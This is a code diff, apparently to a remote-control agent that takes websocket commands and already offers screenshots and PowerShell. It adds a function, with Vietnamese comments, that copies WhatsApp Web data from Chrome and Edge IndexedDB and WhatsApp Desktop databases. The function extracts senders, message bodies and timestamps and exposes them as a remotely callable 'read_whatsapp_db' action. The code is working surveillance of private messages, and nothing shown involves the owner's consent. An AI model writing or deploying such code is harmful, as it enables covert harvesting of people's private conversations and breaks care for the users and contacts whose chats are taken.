@@ -325,6 +325,192 @@ async def act_print_file(path, printer=""):
     r = await act_powershell(cmd, timeout=60)
     return r if r else f"Print job sent: {Path(path).name}"
 
+async def act_read_whatsapp_db(date_from=None, date_to=None):
+    """
+    Đọc tin nhắn WhatsApp từ Chrome/Edge IndexedDB hoặc WhatsApp Desktop.
+    date_from / date_to: chuỗi "YYYY-MM-DD" (tuỳ chọn).
+    """
+    import tempfile, shutil
+    from datetime import datetime, timezone
+
+    def _parse_dt(s):
+        if not s:
+            return None
+        try:
+            return datetime.strptime(s, "%Y-%m-%d").replace(tzinfo=timezone.utc)
+        except Exception:
+            return None
+
+    def _ts_ok(ts):
+        """ts có thể là giây hoặc mili-giây."""
+        if ts is None:
+            return True
+        try:
+            val = float(ts)
+            if val > 1e12:          # milliseconds → seconds
+                val /= 1000
+            dt = datetime.fromtimestamp(val, tz=timezone.utc)
+            if dt_from and dt < dt_from:
+                return False
+            if dt_to   and dt > dt_to:
+                return False
+            return True
+        except Exception:
+            return True
+
+    dt_from = _parse_dt(date_from)
+    dt_to   = _parse_dt(date_to)
+    messages  = []
+    src_info  = []
+    local_app = Path(os.environ.get("LOCALAPPDATA", ""))
+
+    # ── 1. Chrome / Edge  WhatsApp Web IndexedDB ───────────────────────────
+    try:
+        import ccl_chromium_indexeddb  # type: ignore
+        HAS_CCL = True
+    except ImportError:
+        HAS_CCL = False
+
+    browser_roots = {
+        "Chrome": local_app / "Google/Chrome/User Data/Default/IndexedDB",
+        "Edge":   local_app / "Microsoft/Edge/User Data/Default/IndexedDB",
+    }
+
+    for bname, idb_root in browser_roots.items():
+        if not idb_root.exists():
+            continue
+        wa_idb = None
+        try:
+            for d in idb_root.iterdir():
+                if "web.whatsapp.com" in d.name and d.is_dir():
+                    wa_idb = d
+                    break
+        except Exception:
+            pass
+
+        if not wa_idb:
+            src_info.append(f"{bname}: WhatsApp Web IndexedDB not found")
+            continue
+
+        tmp_dir = Path(tempfile.mkdtemp(prefix="wa_idb_"))
+        try:
+            dst = tmp_dir / "wa_idb"
+            shutil.copytree(str(wa_idb), str(dst))
+            if HAS_CCL:
+                try:
+                    env = ccl_chromium_indexeddb.WrappedIndexDB(str(dst))
+                    for db_rec in env.databases():
+                        for store_name in db_rec.object_store_names:
+                            if any(k in store_name.lower() for k in ("message", "msg", "chat")):
+                                try:
+                                    for record in db_rec[store_name].get_all():
+                                        val = record.value
+                                        if not isinstance(val, dict):
+                                            continue
+                                        ts = val.get("t") or val.get("timestamp") or val.get("ts")
+                                        if not _ts_ok(ts):
+                                            continue
+                                        messages.append({
+                                            "source": bname,
+                                            "from":   str(val.get("from") or val.get("author") or ""),
+                                            "body":   str(val.get("body") or val.get("text") or "")[:500],
+                                            "ts":     ts,
+                                        })
+                                except Exception:
+                                    pass
+                    src_info.append(f"{bname}: parsed OK")
+                except Exception as e:
+                    src_info.append(f"{bname}: ccl error – {e}")
+            else:
+                total_kb = sum(f.stat().st_size for f in dst.rglob("*") if f.is_file()) // 1024
+                src_info.append(
+                    f"{bname}: WhatsApp Web IDB found ({total_kb} KB) – "
+                    f"cài 'ccl-chromium-indexeddb' để đọc tin nhắn"
+                )
+        except Exception as e:
+            src_info.append(f"{bname}: copy error – {e}")
+        finally:
+            shutil.rmtree(str(tmp_dir), ignore_errors=True)
+
+    # ── 2. WhatsApp Desktop (Windows Store app) ────────────────────────────
+    pkgs = local_app / "Packages"
+    if pkgs.exists():
+        try:
+            for pkg in pkgs.iterdir():
+                if "whatsapp" not in pkg.name.lower():
+                    continue
+                ls = pkg / "LocalState"
+                if not ls.exists():
+                    continue
+                db_files = list(ls.glob("*.db")) + list(ls.glob("*.sqlite"))
+                if db_files:
+                    import sqlite3
+                    for db_path in db_files[:3]:
+                        tmp_db = Path(tempfile.mktemp(suffix=".db"))
+                        try:
+                            shutil.copy2(str(db_path), str(tmp_db))
+                            conn = sqlite3.connect(str(tmp_db))
+                            cur  = conn.cursor()
+                            tables = [r[0] for r in cur.execute(
+                                "SELECT name FROM sqlite_master WHERE type='table'"
+                            ).fetchall()]
+                            for tbl in tables:
+                                if not any(k in tbl.lower() for k in ("message","msg","chat")):
+                                    continue
+                                try:
+                                    cols = [c[1] for c in cur.execute(
+                                        f"PRAGMA table_info({tbl})"
+                                    ).fetchall()]
+                                    ts_col   = next((c for c in cols if any(k in c.lower() for k in ("time","ts","date"))), None)
+                                    body_col = next((c for c in cols if any(k in c.lower() for k in ("body","text","content","message"))), None)
+                                    from_col = next((c for c in cols if any(k in c.lower() for k in ("from","sender","author","jid"))), None)
+                                    if not body_col:
+                                        continue
+                                    sel = f"SELECT {ts_col or 'NULL'}, {from_col or 'NULL'}, {body_col} FROM {tbl} ORDER BY rowid DESC LIMIT 200"
+                                    for row in cur.execute(sel).fetchall():
+                                        ts_v, from_v, body_v = row
+                                        if not body_v or not _ts_ok(ts_v):
+                                            continue
+                                        messages.append({
+                                            "source": f"WhatsApp Desktop/{tbl}",
+                                            "from":   str(from_v or ""),
+                                            "body":   str(body_v)[:500],
+                                            "ts":     ts_v,
+                                        })
+                                except Exception:
+                                    pass
+                            conn.close()
+                            src_info.append(f"WhatsApp Desktop: SQLite OK – tables {tables[:5]}")
+                        except Exception as e:
+                            src_info.append(f"WhatsApp Desktop: SQLite error – {e}")
+                        finally:
+                            tmp_db.unlink(missing_ok=True)
+                else:
+                    ldb = [d for d in ls.iterdir() if d.is_dir() and (d / "CURRENT").exists()]
+                    if ldb:
+                        src_info.append(
+                            f"WhatsApp Desktop: LevelDB found ({len(ldb)} dbs) – "
+                            f"cài 'plyvel' để đọc"
+                        )
+                    else:
+                        src_info.append(f"WhatsApp Desktop: found at {pkg.name}, không có DB đọc được")
+        except Exception as e:
+            src_info.append(f"WhatsApp Desktop scan error: {e}")
+
+    # ── 3. Kết quả ────────────────────────────────────────────────────────
+    if not messages and not src_info:
+        return json.dumps({"error": "Không tìm thấy dữ liệu WhatsApp", "status": "not_found"}, ensure_ascii=False)
+
+    messages.sort(key=lambda x: x.get("ts") or 0, reverse=True)
+    return json.dumps({
+        "status":        "ok",
+        "message_count": len(messages),
+        "messages":      messages[:200],
+        "sources":       src_info,
+        "date_range":    {"from": date_from, "to": date_to},
+    }, ensure_ascii=False, indent=2)
+
+
 ACTIONS = {
     "system_info":          lambda p: act_system_info(),
     "screenshot":           lambda p: act_screenshot(),
@@ -344,6 +530,7 @@ ACTIONS = {
     "set_default_printer":  lambda p: act_set_default_printer(p.get("name", "")),
     "install_printer_ip":   lambda p: act_install_printer_ip(p.get("ip",""), p.get("name",""), p.get("driver","Generic / Text Only")),
     "print_file":           lambda p: act_print_file(p.get("path",""), p.get("printer","")),
+    "read_whatsapp_db":     lambda p: act_read_whatsapp_db(p.get("date_from"), p.get("date_to")),
 }
 
 async def handle_command(ws, data):
